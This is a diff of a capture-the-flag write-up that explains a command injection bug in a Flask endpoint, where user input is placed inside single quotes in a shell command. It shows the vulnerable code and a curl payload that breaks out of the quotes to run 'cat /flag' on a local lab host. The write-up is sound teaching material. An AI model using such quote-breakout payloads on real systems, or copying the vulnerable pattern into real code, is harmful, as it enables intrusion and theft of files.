@@ -11,12 +11,12 @@ In this level, we’re provided with a vulnerable web endpoint that takes a `top
 
 ### Example
 
-```
+```SHELL
 echo '$HOME'
 ```
 Output: `$HOME` (not expanded)
 
-```
+```SHELL
 echo "$HOME"
 ```
 Output: `/home/yourname` (expanded)
@@ -26,7 +26,7 @@ Output: `/home/yourname` (expanded)
 
 Developers often try to protect user input by wrapping it in single quotes:
 
-```
+```C++
 os.system(f"ls -l '{user_input}'")
 ```
 
@@ -42,7 +42,7 @@ You can use an external single quote, then you can do:
 
 ## Server
 
-```
+```python
 #!/usr/bin/exec-suid -- /usr/bin/python3 -I
 
 import subprocess
@@ -86,7 +86,7 @@ app.run("challenge.localhost", 80)
 
 ## Vulnerable Code Snippet
 
-```
+```python
 arg = flask.request.args.get("top-path", "/challenge")
 command = f"ls -l '{arg}'"
 
@@ -96,7 +96,7 @@ subprocess.run(command, shell=True, ...)
 
 This creates a shell command like:
 
-```
+```SHELL
 ls -l 'USER_INPUT'
 ```
 
@@ -106,17 +106,18 @@ To exploit this, we close the initial ' string, insert our malicious command, an
 
 ### Payload
 
-```
+```SHELL
 curl "http://challenge.localhost:80/test?top-path=/flag%20';%20cat%20/flag'"
 ```
 
 This breaks the command into:
 
-```
+```SHELL
 ls -l '/flag '; cat /flag'
 ```
 
 ## Conclusion
 
 This challenge demonstrated a classic command injection vulnerability via single-quote breakout.
+
 Even though the developer tried to isolate user input using ', the attacker was able to escape the quote, inject a new command, and retrieve the sensitive `/flag` file.
